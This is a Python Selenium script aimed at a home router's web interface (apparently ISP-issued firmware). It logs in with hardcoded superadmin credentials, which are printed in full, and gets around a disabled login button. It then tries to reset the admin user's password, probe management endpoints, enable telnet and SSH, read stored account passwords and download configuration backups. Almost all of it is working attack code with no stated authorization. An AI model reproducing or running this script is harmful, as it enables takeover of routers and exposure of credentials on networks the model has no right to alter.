#!/usr/bin/env python3
"""
Use superadmin session from admin.html to:
1. Try to access API endpoints via AJAX
2. Change admin password via proper CGI endpoint
3. Enable SSH to find admin password
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time, json

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver


def login_superadmin(driver):
    driver.get(f"{ROUTER}/admin.html")
    time.sleep(4)
    user = driver.find_element(By.ID, "txt_Username")
    pw = driver.find_element(By.ID, "txt_Password")
    driver.execute_script("arguments[0].value='';", user)
    driver.execute_script("arguments[0].value='';", pw)
    user.send_keys("adminpldt")
    pw.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
    driver.execute_script("window.setDisable = function() {}; document.getElementById('button').style.display = '';")
    driver.find_element(By.ID, "button").click()
    time.sleep(5)
    url = driver.current_url
    if "login" in url.lower():
        return False
    return True


def ajax_post(driver, url, data):
    try:
        result = driver.execute_script("""
            var result = null;
            $.ajax({
                type: 'POST', async: false, cache: false,
                url: arguments[0],
                data: arguments[1],
                success: function(data) { result = {ok: true, data: String(data).substring(0, 2000)}; },
                error: function(xhr, s, e) { result = {ok: false, status: s, error: e, resp: xhr.responseText ? xhr.responseText.substring(0, 500) : ''}; }
            });
            return result;
        """, url, data)
        return result
    except Exception as e:
        return {"ok": False, "error": str(e)}


def ajax_get(driver, url):
    try:
        result = driver.execute_script("""
            var result = null;
            $.ajax({
                type: 'GET', async: false, cache: false,
                url: arguments[0],
                success: function(data) { result = {ok: true, data: String(data).substring(0, 2000)}; },
                error: function(xhr, s, e) { result = {ok: false, status: s, error: e, resp: xhr.responseText ? xhr.responseText.substring(0, 500) : ''}; }
            });
            return result;
        """, url)
        return result
    except Exception as e:
        return {"ok": False, "error": str(e)}


def get_token(driver):
    return driver.execute_script("""
        var result = null;
        $.ajax({ type: 'POST', async: false, cache: false, url: '/asp/GetRandCount.asp',
            success: function(data) { result = data; } });
        return result;
    """)


def main():
    driver = setup_driver()
    try:
        if not login_superadmin(driver):
            print("Superadmin login failed!")
            return

        print("Logged in as superadmin!")
        level = driver.execute_script("return window.Userlevel;")
        print(f"Userlevel: {level}")

        # Get CSRF token
        token = get_token(driver)
        print(f"CSRF token: {token[:20] if token else 'None'}...")

        # === Phase 1: Try to change admin password via MdfPwdAdminNoLg.cgi with Userlevel manipulation ===
        print("\n=== Phase 1: Direct CGI password change attempts ===\n")

        # Try MdfPwdAdminNoLg.cgi (superadmin password change - known to work)
        r1 = ajax_post(driver, "MdfPwdAdminNoLg.cgi",
            f"x.UserName=adminpldt&z.Password=AC2DIU7QW3ERTY6UPAS4DFG&z.PasswordConfirm=AC2DIU7QW3ERTY6UPAS4DFG&x.X_HW_Token={token}")
        print(f"MdfPwdAdminNoLg.cgi (keep same): {r1}")

        # Try to change admin password via X_HW_WebUserInfo.1 (admin account)
        token = get_token(driver)
        r2 = ajax_post(driver, "MdfPwdAdminNoLg.cgi",
            f"x.UserName=admin&z.Password=Admin9999&z.PasswordConfirm=Admin9999&x.X_HW_Token={token}")
        print(f"MdfPwdAdminNoLg.cgi (admin user): {r2}")

        # Try MdfPwdNormalNoLg.cgi
        token = get_token(driver)
        r3 = ajax_post(driver, "MdfPwdNormalNoLg.cgi",
            f"x.UserName=admin&z.Password=Admin9999&z.PasswordConfirm=Admin9999&x.X_HW_Token={token}")
        print(f"MdfPwdNormalNoLg.cgi (admin): {r3}")

        # === Phase 2: Try to access device info and config endpoints ===
        print("\n=== Phase 2: Probing admin API endpoints ===\n")

        api_endpoints = [
            "/api/system/userinfo",
            "/api/system/version",
            "/api/system/deviceinfo",
            "/api/ntwk/gateway",
            "/api/security/access",
            "/asp/GetUserInfo.asp",
            "/html/ssmp/management/account.asp",
            "/html/ssmp/management/backup.asp",
            "/html/amp/system/Password.asp",
            "/html/amp/system/DeviceInfo.asp",
            "/html/amp/advanced/UserMgmt.asp",
        ]

        for ep in api_endpoints:
            r = ajax_get(driver, ep)
            ok = r.get("ok", False)
            data = r.get("data", "")[:200] if ok else r.get("error", "")
            resp = r.get("resp", "")[:100] if not ok else ""
            if ok and len(data) > 50:
                print(f"  {ep:50s} -> OK ({len(r.get('data',''))} chars)")
                with open(f"ep_{ep.replace('/','_')}.txt", "w", encoding="utf-8") as f:
                    f.write(r["data"])
            else:
                print(f"  {ep:50s} -> {data} {resp}")

        # === Phase 3: Try to enable SSH ===
        print("\n=== Phase 3: Trying to enable SSH ===\n")

        # Try to access security/access control settings
        token = get_token(driver)
        r4 = ajax_post(driver, "/html/amp/security/Firewall.asp",
            f"x.X_HW_Token={token}")
        print(f"Firewall: {r4}")

        # Try direct config write to enable SSH
        token = get_token(driver)
        r5 = ajax_post(driver, "set.cgi",
            f"x=InternetGatewayDevice.DeviceInfo.X_CT-COM_UserInfo&z=InternetGatewayDevice.DeviceInfo&y=1&x.X_CT-COM_TelnetEnable=1&x.X_CT-COM_SSHEnable=1&x.X_HW_Token={token}")
        print(f"set.cgi SSH enable: {r5}")

        token = get_token(driver)
        r6 = ajax_post(driver, "set.cgi",
            f"x=InternetGatewayDevice.DeviceInfo.X_CT-COM_UserInfo&z=InternetGatewayDevice.DeviceInfo&y=1&x.X_CT-COM_WebEnable=1&x.X_HW_Token={token}")
        print(f"set.cgi Web enable: {r6}")

        # === Phase 4: Try to read admin password from config ===
        print("\n=== Phase 4: Reading admin password from device config ===\n")

        # Try to read user info
        token = get_token(driver)
        r7 = ajax_post(driver, "get.cgi",
            f"x=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo&y=1&x.X_HW_Token={token}")
        print(f"get.cgi user info: {r7}")

        token = get_token(driver)
        r8 = ajax_post(driver, "get.cgi",
            f"x=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1&y=1&x.X_HW_Token={token}")
        print(f"get.cgi user 1 (admin): {r8}")

        token = get_token(driver)
        r9 = ajax_post(driver, "get.cgi",
            f"x=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2&y=1&x.X_HW_Token={token}")
        print(f"get.cgi user 2 (superadmin): {r9}")

        # Try to get all user configs
        token = get_token(driver)
        r10 = ajax_post(driver, "get.cgi",
            f"x=InternetGatewayDevice.UserInterface&y=1&x.X_HW_Token={token}")
        print(f"get.cgi UserInterface: {str(r10)[:300]}")

        # Try backup/config download
        print("\n=== Phase 5: Config download attempts ===\n")
        r11 = ajax_get(driver, "/backupsettings.cgi")
        print(f"backupsettings.cgi: {str(r11)[:200]}")

        r12 = ajax_get(driver, "/romfile.cfg")
        print(f"romfile.cfg: {str(r12)[:200]}")

        r13 = ajax_get(driver, "/config.xml")
        print(f"config.xml: {str(r13)[:200]}")

    finally:
        driver.quit()


if __name__ == "__main__":
    main()
